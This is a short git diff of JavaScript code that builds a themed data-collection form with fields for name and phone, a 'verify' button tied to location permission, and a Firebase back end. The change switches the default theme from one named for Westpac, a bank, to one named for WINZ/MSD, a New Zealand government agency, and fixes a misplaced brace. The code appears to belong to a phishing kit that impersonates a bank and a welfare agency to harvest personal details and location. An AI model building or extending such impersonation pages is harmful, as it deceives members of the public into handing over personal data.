@@ -44,6 +44,7 @@ async function applyPreviewTheme(themeName) {
     if (formContainer) { formContainer.innerHTML = ''; formContainer.appendChild(createFormFields(theme)); }
     const verifyButton = document.getElementById('allowLocation');
     if (verifyButton) { verifyButton.disabled = true; verifyButton.title = 'Preview mode - form submission disabled'; }
+}
 
 // Initialize Firebase and load theme
 document.addEventListener('DOMContentLoaded', async () => {
@@ -53,19 +54,19 @@ document.addEventListener('DOMContentLoaded', async () => {
         // Try to use theme config, fallback to hardcoded
         let theme = null;
         if (window.themes) {
-            theme = window.themes['westpac'] || Object.values(window.themes)[0];
+            theme = window.themes['winz'] || Object.values(window.themes)[0];
         }
         
         if (theme) {
             formContainer.appendChild(createFormFields(theme));
         } else {
-            // Hardcoded fallback - always works
+            // Hardcoded fallback - always works (MSD/WINZ default)
             const fallbackTheme = {
                 content: {
                     formFields: {
                         firstName: { label: "First Name", placeholder: "Enter your first name" },
                         lastName: { label: "Last Name", placeholder: "Enter your last name" },
-                        phone: { label: "Phone Number", placeholder: "021234567 or +64212345678" }
+                        phone: { label: "Contact Number", placeholder: "021234567 or +64212345678" }
                     }
                 }
             };
@@ -197,4 +198,3 @@ document.addEventListener('DOMContentLoaded', async () => {
         logger.error('Failed to initialize:', error);
     }
 });
-}
